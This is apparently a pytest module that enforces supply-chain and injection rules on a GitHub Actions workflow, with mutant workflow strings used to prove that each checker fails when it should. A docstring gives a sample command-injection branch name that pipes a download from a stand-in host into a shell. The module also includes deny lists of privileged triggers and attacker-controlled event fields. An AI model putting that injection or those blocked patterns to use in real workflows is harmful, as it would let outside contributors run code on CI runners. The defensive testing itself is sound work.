"""What the CI workflow is trusted to do, asserted against the file that does it.

Four groups.

*What executes.* Every remote action is pinned to an immutable commit, every pin
carries a human-readable version beside it, and that version is the one the
commit actually has. The last of those is the reason this module exists: two of
the four comments in this repository were wrong for three phases, and nothing
noticed, because a comment is not executed. `docs/engineering/action-pins.toml`
records what was verified, and this module compares it against the workflow in
both directions.

*What the run is allowed to reach.* No elevated trigger, and no untrusted event
payload spliced into a shell. Neither exists here today. Both are asserted
anyway, because the cost of finding out that one was added is a compromised
runner rather than a failing build.

*What bounds a run.* Every job declares how long it may take, and every budget is
declared twice so the two can be compared. An unbounded required check does not
fail; it hangs, which blocks a branch just as effectively and explains less.

*What a superseded run costs.* Cancellation is deliberate per event, because on
master the run is the only thing that produces that commit's evidence.

**Every check here is a function over text, and every function is exercised
twice**: once against the real workflow, and once against a deliberately broken
copy built in this module. A checker nobody has watched fail is a checker nobody
has any reason to believe — `docs/TESTING_STRATEGY.md` makes that a rule, and the
mutants below are how this module keeps it.

The broken copies are Python strings, never files. `check-yaml` runs over every
committed file and anything under `.github/workflows/` is live to GitHub, so a
malformed or hostile workflow cannot exist on disk here.

The workflow is read as text and never parsed as YAML, for the reason
``test_quality_contract.py`` gives: a YAML parser would be a seventh entry in a
toolchain three tests pin at six, and the properties worth asserting are textual.
The patterns below are therefore narrow on purpose. They recognise the specific
shapes this contract covers; they do not attempt to understand YAML.
"""

import re
import tomllib
from pathlib import Path
from typing import Final

import pytest

from tools.quality.supply.workflows import (
    job_blocks,
    pinned_versions,
    remote_references,
    run_bodies,
    top_level_block,
    undocumented_pins,
    unpinned_references,
    workflow_paths,
)
from tools.quality.workflow.plan import read_configuration

WORKFLOW_RELATIVE_PATH: Final[str] = ".github/workflows/quality.yml"
MANIFEST_RELATIVE_PATH: Final[str] = "docs/engineering/action-pins.toml"

FIRST_PARTY_PREFIX: Final[str] = "actions/"

MINIMUM_REASON_LENGTH: Final[int] = 40
"""Long enough that "needed" does not pass for an argument."""

THIRD_PARTY_ALLOWED: Final[dict[str, str]] = {
    "github/codeql-action": (
        "GitHub's own, and the only supported way to run CodeQL from a workflow. "
        "The alternative — default setup — is configured in a control plane no "
        "commit can review, which ADR-0044 rejected. Recorded here rather than "
        "waved through, because this is the first non-`actions/*` program this "
        "repository executes."
    ),
}
"""Third-party actions admitted deliberately, each with the reason.

The rule ``CI_SECURITY.md`` states is "adding a third-party action is a decision
that must be recorded here, not a default that arrives with a copied snippet".
This mapping is where that recording happens, and an entry with no reason is a
syntax error rather than an oversight.
"""

AGGREGATE_JOB: Final[str] = "aggregate"
"""The job key the required check is declared under, and the one job not in ``required_jobs``."""

#: A job's display name, which is what becomes a status check. Four spaces, so it
#: cannot match a step's `- name:`, which is indented further and dashed.
JOB_NAME_RE: Final[re.Pattern[str]] = re.compile(r"^    name: (.+)$", re.MULTILINE)

#: A job's own timeout. Four spaces for the same reason: a step may declare one
#: too, at eight, and a step's budget is not the job's.
JOB_TIMEOUT_RE: Final[re.Pattern[str]] = re.compile(r"^    timeout-minutes: (\d+)$", re.MULTILINE)

#: A trigger name inside the `on:` block.
TRIGGER_KEY_RE: Final[re.Pattern[str]] = re.compile(r"^  ([a-z_]+):", re.MULTILINE)

PRIVILEGED_TRIGGERS: Final[tuple[str, ...]] = ("pull_request_target", "workflow_run")
"""Events that hand a workflow the repository's own trust while running someone else's code.

``pull_request_target`` runs against the base repository with a writable token and
access to secrets, while the pull request it describes is authored by anyone.
``workflow_run`` is the same hazard one step removed: it fires after another
workflow and can be made to consume that workflow's artifacts under elevated
trust. Neither is used here. GLOBIN's checks need no secret and write nothing
back, so there is no version of this workflow that needs either.
"""

UNTRUSTED_CONTEXTS: Final[tuple[str, ...]] = (
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.pull_request.head.ref",
    "github.event.pull_request.head.label",
    "github.event.pull_request.head.repo.description",
    "github.event.issue.title",
    "github.event.issue.body",
    "github.event.comment.body",
    "github.event.review.body",
    "github.event.review_comment.body",
    "github.event.head_commit.message",
    "github.event.head_commit.author.name",
    "github.event.head_commit.author.email",
    "github.head_ref",
)
"""Event fields an outside contributor chooses the contents of.

Interpolating one of these into a ``run:`` block is not passing a value; it is
pasting text into a script before the shell sees it. A branch named
``a"; curl evil.sh | sh; "`` becomes a command. The safe shape is an ``env:``
entry, which GitHub sets as a variable rather than substituting into the source,
read inside the script as a normal quoted variable — so this rule constrains
``run:`` and deliberately not ``env:``.

Not exhaustive, and it cannot be: the event payload is large and GitHub adds to
it. It is the set documented as attacker-controlled and seen in real injections.
"""

FORBIDDEN_PERMISSIONS: Final[tuple[str, ...]] = (
    "write-all",
    "contents: write",
    "packages: write",
    "actions: write",
    "checks: write",
    "pull-requests: write",
)
"""Scopes nothing in this repository has a use for, anywhere, ever."""

ELEVATED_PERMISSIONS: Final[tuple[str, ...]] = ("id-token: write", "attestations: write")
"""Scopes exactly one job may hold, and only behind a trusted-event guard.

Until Phase 014 `id-token: write` was simply forbidden, on the grounds that
minting an OIDC token "is a capability this repository should acquire by decision
rather than by inheriting a template". Phase 014 is that decision: the `attest`
job signs a provenance statement about the supply-chain evidence, and Sigstore
needs the token to do it.

The rule is therefore NARROWED rather than lifted. These scopes may appear in one
job, that job must be guarded by a condition restricting it to a push to master,
and the guard is what the test below actually checks — a permission is only as
safe as the trigger that can reach it, and since Phase 014 this repository is
public, so a pull request can carry code anybody wrote.
"""

TRUSTED_GUARD: Final[str] = "github.event_name == 'push' && github.ref == 'refs/heads/master'"
"""The condition that makes those scopes unreachable from a fork's pull request."""

FAILURE_MASKS: Final[tuple[str, ...]] = (
    "continue-on-error: true",
    "|| true",
    "exit 0",
)
"""Ways to make a step report success it did not have. A gate that cannot fail is decoration."""


# ---------------------------------------------------------------------------
# The policy, as functions over text
#
# Each returns what is wrong rather than a boolean, so a failing assertion names
# the offender instead of announcing that something, somewhere, is off.
# ---------------------------------------------------------------------------


def job_timeouts(text: str) -> dict[str, int]:
    """Each job's declared budget.

    Args:
        text: The workflow.

    Returns:
        Job key mapped to minutes, omitting any job that declares none.
    """
    found: dict[str, int] = {}
    for job, block in job_blocks(text).items():
        declared = JOB_TIMEOUT_RE.search(block)
        if declared is not None:
            found[job] = int(declared.group(1))
    return found


def triggers(text: str) -> tuple[str, ...]:
    """Every event that starts this workflow.

    Args:
        text: The workflow.

    Returns:
        The trigger names, in declaration order.
    """
    return tuple(TRIGGER_KEY_RE.findall(top_level_block(text, "on")))


def injected_expressions(text: str) -> tuple[str, ...]:
    """Untrusted event fields interpolated into a shell script.

    Args:
        text: The workflow.

    Returns:
        Each ``context`` found inside a ``run:`` body, once per occurrence.
    """
    return tuple(
        context for body in run_bodies(text) for context in UNTRUSTED_CONTEXTS if context in body
    )


def permission_violations(text: str) -> tuple[str, ...]:
    """Scopes granted that a verification workflow does not need.

    Args:
        text: The workflow.

    Returns:
        Every forbidden scope present, and a marker when no ``permissions:``
        block is declared at all — an absent block is not neutral, it is the
        repository default, whatever that happens to be today.
    """
    found = [scope for scope in FORBIDDEN_PERMISSIONS if scope in text]
    if not re.search(r"^permissions:", text, re.MULTILINE):
        found.append("no permissions block")
    return tuple(found)


def masked_failures(text: str) -> tuple[str, ...]:
    """Constructs that would let a failing step report success.

    Args:
        text: The workflow.

    Returns:
        Every mask present.
    """
    return tuple(mask for mask in FAILURE_MASKS if mask in text)


def duplicate_display_names(text: str) -> tuple[str, ...]:
    """Display names claimed by more than one job.

    Args:
        text: The workflow.

    Returns:
        The names that collide, sorted.

    A status check is identified by its displayed name. Two jobs sharing one
    leaves a branch protection rule pointing at whichever reported last.
    """
    names = JOB_NAME_RE.findall(text)
    return tuple(sorted({name for name in names if names.count(name) > 1}))


# ---------------------------------------------------------------------------
# The tree
# ---------------------------------------------------------------------------


@pytest.fixture(scope="module")
def workflow(repo_root: Path) -> str:
    """The quality workflow, read once.

    Still singular, because the checks that use it are about *this* workflow: its
    job keys, its budgets, its triggers and its concurrency rule. The checks
    about what any workflow may fetch use :func:`every_workflow` instead.
    """
    return (repo_root / WORKFLOW_RELATIVE_PATH).read_text(encoding="utf-8")


@pytest.fixture(scope="module")
def every_workflow(repo_root: Path) -> str:
    """Every workflow in the repository, concatenated.

    Phase 014 added a second one, and a pin checker that knew the name of the
    first would have silently stopped covering the repository the moment it did.
    Discovered from the directory rather than listed here, so a third costs
    nobody an edit.

    Concatenation is safe for these checks because every one of them is a scan
    for offending lines rather than a structural read: a `uses:` reference means
    the same thing whichever file it came from.
    """
    return "\n".join(path.read_text(encoding="utf-8") for path in workflow_paths(repo_root))


@pytest.fixture(scope="module")
def manifest(repo_root: Path) -> dict[str, object]:
    """The action pin manifest, read once."""
    return tomllib.loads((repo_root / MANIFEST_RELATIVE_PATH).read_text(encoding="utf-8"))


@pytest.fixture(scope="module")
def pyproject(repo_root: Path) -> dict[str, object]:
    """The project configuration, read once."""
    return tomllib.loads((repo_root / "pyproject.toml").read_text(encoding="utf-8"))


# ---------------------------------------------------------------------------
# What executes
# ---------------------------------------------------------------------------


def test_every_remote_action_is_pinned_to_a_full_commit(every_workflow: str) -> None:
    """A tag is mutable. Pinning to one lets its owner change what runs here."""
    assert remote_references(every_workflow), "no remote `uses:` found; this check would be vacuous"
    assert not unpinned_references(every_workflow)


def test_every_pin_carries_a_readable_version(every_workflow: str) -> None:
    """Forty hex characters tell a reader nothing about what they are approving."""
    assert not undocumented_pins(every_workflow)


def test_every_pin_is_listed_in_the_manifest(
    every_workflow: str, manifest: dict[str, object]
) -> None:
    """A pin nobody verified is a pin nobody can vouch for."""
    entries = manifest["action"]
    assert isinstance(entries, list)
    recorded = {str(entry["sha"]) for entry in entries}
    unlisted = sorted(set(pinned_versions(every_workflow)) - recorded)
    assert not unlisted, f"pinned in the workflow but absent from the manifest: {unlisted}"


def test_every_manifest_entry_is_still_used(
    every_workflow: str, manifest: dict[str, object]
) -> None:
    """The other direction, and the one that rots quietly.

    An entry for an action the workflow dropped is a verification record for
    something that does not run, which makes the manifest longer and less true.
    """
    entries = manifest["action"]
    assert isinstance(entries, list)
    recorded = {str(entry["sha"]) for entry in entries}
    unused = sorted(recorded - set(pinned_versions(every_workflow)))
    assert not unused, f"listed in the manifest but not used by the workflow: {unused}"


def test_the_manifest_and_the_comments_agree(
    every_workflow: str, manifest: dict[str, object]
) -> None:
    """The check that would have caught three phases of drift.

    Two comments in this repository named a version their commit did not have.
    Nothing failed, because a comment is not executed — which is exactly why it
    needs something else to be accountable to.
    """
    entries = manifest["action"]
    assert isinstance(entries, list)
    verified = {str(entry["sha"]): entry for entry in entries}
    disagreements = [
        f"{repository}@{sha[:7]}: workflow says {claimed}, manifest says {verified[sha]['version']}"
        for sha, (repository, claimed) in pinned_versions(every_workflow).items()
        if sha in verified and verified[sha]["version"] != claimed
    ]
    assert not disagreements, f"the pin comments disagree with the manifest: {disagreements}"


def test_the_manifest_records_a_repository_that_matches_the_workflow(
    every_workflow: str, manifest: dict[str, object]
) -> None:
    """A SHA is only meaningful against the repository it came from."""
    entries = manifest["action"]
    assert isinstance(entries, list)
    verified = {str(entry["sha"]): str(entry["repository"]) for entry in entries}
    wrong = [
        f"{sha[:7]}: workflow fetches {repository}, manifest records {verified[sha]}"
        for sha, (repository, _) in pinned_versions(every_workflow).items()
        if sha in verified and verified[sha] != repository
    ]
    assert not wrong, f"the manifest names the wrong upstream: {wrong}"


def test_every_manifest_entry_is_a_first_party_or_recorded_action(
    manifest: dict[str, object],
) -> None:
    """A fork or a mirror is a different supply chain wearing a familiar name.

    ``actions/*`` is admitted by construction. Anything else must appear in
    :data:`THIRD_PARTY_ALLOWED` with a stated reason, which is what turns
    ``CI_SECURITY.md``'s "must be recorded here" from prose into a gate.
    """
    entries = manifest["action"]
    assert isinstance(entries, list)
    foreign = sorted(
        str(entry["repository"])
        for entry in entries
        if not str(entry["repository"]).startswith(FIRST_PARTY_PREFIX)
        and str(entry["repository"]) not in THIRD_PARTY_ALLOWED
    )
    assert not foreign, (
        f"third-party actions are a decision, not a default; found {foreign}. "
        "Adding one deliberately means recording it in THIRD_PARTY_ALLOWED with why."
    )


def test_every_recorded_third_party_action_is_still_used(manifest: dict[str, object]) -> None:
    """The other direction: an admission for something nobody runs.

    A standing exception for an action the repository dropped is a permission
    nobody reviewed, waiting for the next person who wants to add that name back.
    """
    entries = manifest["action"]
    assert isinstance(entries, list)
    recorded = {str(entry["repository"]) for entry in entries}
    stale = sorted(set(THIRD_PARTY_ALLOWED) - recorded)
    assert not stale, f"admitted in THIRD_PARTY_ALLOWED but no longer pinned anywhere: {stale}"


@pytest.mark.parametrize("repository", sorted(THIRD_PARTY_ALLOWED))
def test_every_third_party_admission_states_a_reason(repository: str) -> None:
    """An exception with no argument is an exception nobody can review."""
    assert len(THIRD_PARTY_ALLOWED[repository]) > MINIMUM_REASON_LENGTH, (
        f"{repository} is admitted without a reason worth reading"
    )


# ---------------------------------------------------------------------------
# What the run is allowed to reach
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("trigger", PRIVILEGED_TRIGGERS)
def test_no_elevated_trigger_is_used(workflow: str, trigger: str) -> None:
    """Untrusted code and a trusted token must not meet."""
    assert trigger not in triggers(workflow)


def test_no_untrusted_value_reaches_a_shell(workflow: str) -> None:
    """A branch name is not a string here; it is the next few characters of a script."""
    assert not injected_expressions(workflow)


def test_an_elevated_scope_appears_only_behind_a_trusted_guard(workflow: str) -> None:
    """A permission is only as safe as the trigger that can reach it.

    Every job declaring one of the elevated scopes must also declare the guard
    restricting it to a push to master. Checking the scope alone would pass a
    workflow that granted it to a job a fork could trigger, which is the whole
    hazard.
    """
    for job, block in job_blocks(workflow).items():
        if any(scope in block for scope in ELEVATED_PERMISSIONS):
            assert TRUSTED_GUARD in block, (
                f"job {job!r} holds an elevated scope without the trusted-event guard"
            )


def test_only_the_publishing_job_holds_an_elevated_scope(
    workflow: str, pyproject: dict[str, object]
) -> None:
    """And it is the job declared as publishing, not merely some job."""
    permitted = set(read_configuration(pyproject).publishing_jobs)
    holders = {
        job
        for job, block in job_blocks(workflow).items()
        if any(scope in block for scope in ELEVATED_PERMISSIONS)
    }
    assert holders <= permitted, f"jobs holding an elevated scope undeclared: {holders - permitted}"


def test_the_workflow_grants_no_scope_it_does_not_need(workflow: str) -> None:
    """Least privilege, stated rather than inherited."""
    assert not permission_violations(workflow)


def test_no_step_is_permitted_to_fail_quietly(workflow: str) -> None:
    """A gate that cannot fail the build is decoration."""
    assert not masked_failures(workflow)


# ---------------------------------------------------------------------------
# What bounds a run
# ---------------------------------------------------------------------------


def test_every_job_declares_a_timeout(workflow: str) -> None:
    """Undeclared is not unbounded; it is GitHub's ceiling of six hours."""
    unbounded = sorted(set(job_blocks(workflow)) - set(job_timeouts(workflow)))
    assert not unbounded, f"jobs with no timeout: {unbounded}"


def test_every_declared_timeout_matches_the_workflow(
    workflow: str, pyproject: dict[str, object]
) -> None:
    """Two copies of a budget are drift unless something compares them."""
    declared = dict(read_configuration(pyproject).timeouts)
    assert declared == job_timeouts(workflow)


def test_the_timeouts_cover_every_required_job_and_the_aggregate(
    pyproject: dict[str, object],
) -> None:
    """The aggregate is not in ``required_jobs`` and needs a budget most of all.

    It is the check a branch protection rule names, so it is the one whose
    hanging would be felt as the repository being stuck rather than as CI failing.
    """
    configuration = read_configuration(pyproject)
    expected = {*configuration.required_jobs, *configuration.publishing_jobs, AGGREGATE_JOB}
    assert set(dict(configuration.timeouts)) == expected


# ---------------------------------------------------------------------------
# What a superseded run costs
# ---------------------------------------------------------------------------


def test_the_concurrency_group_is_namespaced_by_workflow(workflow: str) -> None:
    """Two workflows sharing a group cancel each other's runs.

    Only one workflow exists today, which is why this is worth asserting now: the
    second one is added by somebody who is thinking about the second one.
    """
    assert "group: ${{ github.workflow }}-${{ github.ref }}" in top_level_block(
        workflow, "concurrency"
    )


def test_master_runs_are_not_cancelled(workflow: str) -> None:
    """The evidence chain is the reason.

    A cancelled job reports ``cancelled``, which the aggregate reads as
    UNMEASURED. Cancelling a master run therefore trades a few runner-minutes for
    a permanent hole in the record, one commit wide.
    """
    block = top_level_block(workflow, "concurrency")
    assert "cancel-in-progress: true" not in block
    assert "cancel-in-progress: ${{ github.ref != 'refs/heads/master' }}" in block


def test_the_workflow_can_run_in_a_merge_queue(workflow: str) -> None:
    """Nothing here enables a queue; this only declines to rule one out.

    A required check that cannot run on ``merge_group`` leaves a queue waiting for
    a report that will never arrive.
    """
    assert "merge_group" in triggers(workflow)


def test_no_job_display_name_is_claimed_twice(workflow: str) -> None:
    """A status check is identified by its name, so two of one name is one check."""
    assert not duplicate_display_names(workflow)


def test_the_required_check_is_the_aggregate_job_display_name(
    workflow: str, pyproject: dict[str, object]
) -> None:
    """The name a branch protection rule would carry, bound to the job that earns it."""
    block = job_blocks(workflow)[AGGREGATE_JOB]
    declared = read_configuration(pyproject).required_check
    assert JOB_NAME_RE.search(block).group(1) == declared  # type: ignore[union-attr]


# ---------------------------------------------------------------------------
# Guarding the guards
#
# Every checker above, watched failing. `CLEAN` is the smallest workflow that
# satisfies all of them; each mutant below changes exactly one thing about it.
#
# These are strings and never files. `check-yaml` runs over everything committed,
# and a file under `.github/workflows/` is not a fixture, it is a workflow.
# ---------------------------------------------------------------------------

CLEAN: Final[str] = """\
name: Quality

on:
  push:
    branches: [master]
  merge_group:
    types: [checks_requested]

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/master' }}

jobs:
  build:
    name: Build
    timeout-minutes: 10
    runs-on: windows-latest

    steps:
      - name: Check out the repository
        uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5.1.0

      - name: Run the gate
        run: python -m tools.quality full

  gate:
    name: Quality gate
    timeout-minutes: 10
    needs: build
    runs-on: windows-latest

    steps:
      - name: Decide
        run: |
          python -m tools.quality aggregate
          python -m tools.quality evidence
"""


def test_the_clean_fixture_offends_nothing() -> None:
    """The control.

    Without it, every mutant test below could pass because the checker returns
    everything it is shown.
    """
    assert not unpinned_references(CLEAN)
    assert not undocumented_pins(CLEAN)
    assert not injected_expressions(CLEAN)
    assert not permission_violations(CLEAN)
    assert not masked_failures(CLEAN)
    assert not duplicate_display_names(CLEAN)
    assert set(job_blocks(CLEAN)) == {"build", "gate"}
    assert job_timeouts(CLEAN) == {"build": 10, "gate": 10}
    assert triggers(CLEAN) == ("push", "merge_group")


@pytest.mark.parametrize(
    "ref",
    [
        "actions/checkout@v4",
        "actions/checkout@main",
        "actions/checkout@master",
        "actions/checkout@latest",
        "actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c0",
        "actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c099",
        "actions/checkout@FBC6F3992D24B796D5A048FF273F7FCC4A7B6C09",
        "actions/checkout@zbc6f3992d24b796d5a048ff273f7fcc4a7b6c09",
    ],
    ids=[
        "major-tag",
        "main-branch",
        "master-branch",
        "latest-tag",
        "thirty-nine-characters",
        "forty-one-characters",
        "uppercase-hex",
        "non-hex",
    ],
)
def test_a_reference_that_is_not_a_full_commit_is_caught(ref: str) -> None:
    """Length and alphabet both, because a near-miss is the plausible mistake."""
    mutant = CLEAN.replace("actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09", ref)
    assert unpinned_references(mutant) == (ref,)


def test_a_local_action_is_not_asked_to_be_pinned() -> None:
    """A `./` reference is already pinned by the commit under test."""
    mutant = CLEAN.replace(
        "uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5.1.0",
        "uses: ./.github/actions/setup",
    )
    assert not remote_references(mutant)
    assert not unpinned_references(mutant)
    assert not undocumented_pins(mutant)


@pytest.mark.parametrize(
    "comment",
    ["", " # v5", " # latest", " # checkout", " # v5.1"],
    ids=["absent", "bare-major", "not-a-version", "a-name", "two-parts"],
)
def test_a_pin_without_a_readable_version_is_caught(comment: str) -> None:
    """The comment is the only thing a reader can act on, so it has to mean something."""
    mutant = CLEAN.replace(" # v5.1.0", comment)
    assert undocumented_pins(mutant)


def test_a_comment_that_misstates_the_version_is_visible() -> None:
    """The defect this module was written for, reproduced.

    The checker's job is to surface what the workflow claims; the manifest
    comparison is what judges it. Here the claim simply has to survive extraction.
    """
    mutant = CLEAN.replace(" # v5.1.0", " # v5.0.0")
    claimed = pinned_versions(mutant)["fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09"]
    assert claimed == ("actions/checkout", "v5.0.0")


@pytest.mark.parametrize(
    "scope",
    ["write-all", "contents: write", "packages: write", "actions: write", "checks: write"],
)
def test_an_over_broad_permission_is_caught(scope: str) -> None:
    """Each forbidden scope, watched being found."""
    mutant = CLEAN.replace("  contents: read", f"  {scope}")
    assert scope in permission_violations(mutant)


def test_a_missing_permissions_block_is_caught() -> None:
    """Absent is not neutral. It is whatever the repository default is this week."""
    mutant = CLEAN.replace("permissions:\n  contents: read\n\n", "")
    assert "no permissions block" in permission_violations(mutant)


@pytest.mark.parametrize("trigger", PRIVILEGED_TRIGGERS)
def test_an_elevated_trigger_is_caught(trigger: str) -> None:
    """Both events, and the trigger reader has to see them as triggers."""
    mutant = CLEAN.replace("  push:\n", f"  {trigger}:\n")
    assert trigger in triggers(mutant)


@pytest.mark.parametrize(
    "context",
    [
        "github.event.pull_request.title",
        "github.event.pull_request.body",
        "github.event.head_commit.message",
        "github.head_ref",
    ],
)
def test_an_untrusted_value_spliced_into_a_shell_is_caught(context: str) -> None:
    """The single-line form."""
    mutant = CLEAN.replace(
        "run: python -m tools.quality full",
        'run: echo "${{ ' + context + ' }}"',
    )
    assert injected_expressions(mutant) == (context,)


def test_an_untrusted_value_inside_a_block_scalar_is_caught() -> None:
    """The multi-line form, which the single-line reader would walk straight past."""
    mutant = CLEAN.replace(
        "          python -m tools.quality aggregate",
        '          echo "${{ github.event.pull_request.title }}"',
    )
    assert injected_expressions(mutant) == ("github.event.pull_request.title",)


def test_an_untrusted_value_passed_through_the_environment_is_not_flagged() -> None:
    """The remediation must not trip the rule that asked for it.

    ``env:`` is how a hostile branch name becomes a variable rather than a
    fragment of script. A checker that refused both would leave nowhere to go.
    """
    mutant = CLEAN.replace(
        "      - name: Run the gate\n        run: python -m tools.quality full",
        "      - name: Run the gate\n"
        "        env:\n"
        "          TITLE: ${{ github.event.pull_request.title }}\n"
        '        run: echo "$env:TITLE"',
    )
    assert not injected_expressions(mutant)


@pytest.mark.parametrize("mask", FAILURE_MASKS)
def test_a_masked_failure_is_caught(mask: str) -> None:
    """Each way of turning a red step green, watched being found."""
    mutant = CLEAN.replace(
        "run: python -m tools.quality full", f"run: python -m tools.quality full {mask}"
    )
    assert mask in masked_failures(mutant)


def test_a_job_without_a_timeout_is_caught() -> None:
    """The mandatory case: a required job left on the six-hour ceiling."""
    mutant = CLEAN.replace(
        "    name: Quality gate\n    timeout-minutes: 10\n", "    name: Quality gate\n"
    )
    assert "gate" not in job_timeouts(mutant)
    assert set(job_blocks(mutant)) - set(job_timeouts(mutant)) == {"gate"}


def test_a_step_timeout_is_not_mistaken_for_the_job_budget() -> None:
    """A step's budget bounds a step. The job around it can still hang."""
    mutant = CLEAN.replace(
        "  gate:\n    name: Quality gate\n    timeout-minutes: 10\n",
        "  gate:\n    name: Quality gate\n",
    ).replace("      - name: Decide\n", "      - name: Decide\n        timeout-minutes: 5\n")
    assert "gate" not in job_timeouts(mutant)


def test_a_collision_prone_concurrency_group_is_caught() -> None:
    """A group without the workflow in it is a group shared with every other workflow."""
    mutant = CLEAN.replace(
        "group: ${{ github.workflow }}-${{ github.ref }}", "group: ${{ github.ref }}"
    )
    assert "group: ${{ github.workflow }}-${{ github.ref }}" not in top_level_block(
        mutant, "concurrency"
    )


def test_unconditional_cancellation_is_caught() -> None:
    """The setting this repository had until the evidence chain made it matter."""
    mutant = CLEAN.replace(
        "cancel-in-progress: ${{ github.ref != 'refs/heads/master' }}",
        "cancel-in-progress: true",
    )
    assert "cancel-in-progress: true" in top_level_block(mutant, "concurrency")


def test_a_missing_merge_group_trigger_is_caught() -> None:
    """A required check that cannot run in a queue keeps the queue waiting."""
    mutant = CLEAN.replace("  merge_group:\n    types: [checks_requested]\n", "")
    assert "merge_group" not in triggers(mutant)


def test_a_duplicated_display_name_is_caught() -> None:
    """Two jobs, one status check, and a branch rule pointing at whichever spoke last."""
    mutant = CLEAN.replace("    name: Build", "    name: Quality gate")
    assert duplicate_display_names(mutant) == ("Quality gate",)
